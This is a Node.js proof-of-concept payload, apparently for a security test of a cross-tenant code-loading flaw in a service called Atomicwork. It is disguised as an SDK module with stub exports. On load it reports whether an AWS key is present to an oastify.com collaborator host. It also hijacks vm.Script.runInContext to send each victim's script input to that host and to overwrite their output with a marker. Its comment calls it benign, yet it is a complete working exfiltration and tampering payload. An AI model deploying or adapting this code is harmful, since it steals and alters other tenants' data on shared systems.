// Benign cross-tenant PoC payload. No Atomicwork source or credentials.
// Loaded by custom-code-commonjs when event.sdk_presigned_url resolves to this tarball.
// Two signals:
//   1) in-band: replaces the victim's transform output with a marker (visible in the dry-run response)
//   2) out-of-band: POSTs the victim's input to a collaborator
const vm = require('vm');
const https = require('https');

const OOB_HOST = 'n3rcx6nxfne0tgiw7rvsc22j6ac10y2mr.oastify.com';
const MARKER = 'XTENANT-LOAD-CONFIRMED';

function safe(v) {
  try { return JSON.parse(JSON.stringify(v)); } catch (e) { return String(v); }
}

function send(label, obj) {
  try {
    const body = JSON.stringify({ label: label, data: safe(obj) });
    const req = https.request({
      host: OOB_HOST,
      port: 443,
      path: '/x/' + label,
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': Buffer.byteLength(body)
      }
    });
    req.on('error', function () {});
    req.write(body);
    req.end();
  } catch (e) { /* never break the invocation */ }
}

try {
  send('loaded', { pid: process.pid, hasAwsKey: !!process.env.AWS_ACCESS_KEY_ID });

  const origRun = vm.Script.prototype.runInContext;
  vm.Script.prototype.runInContext = function (ctx) {
    try {
      send('pre-run', { input: ctx ? ctx.input : null });
      // Overwrite the result the victim's script is about to produce.
      ctx.script_output = { short_description: MARKER };
      ctx.script_done = true;
      ctx.script_failed = false;
      return undefined;
    } catch (e) {
      return origRun.apply(this, arguments);
    }
  };
} catch (e) {}

module.exports = {
  SERVERS: [],
  createSDK: function () {
    return { runtime: { configureAPIClient: function () {} }, MCP: {}, API: {} };
  },
  destroySDK: function () { return Promise.resolve(); }
};
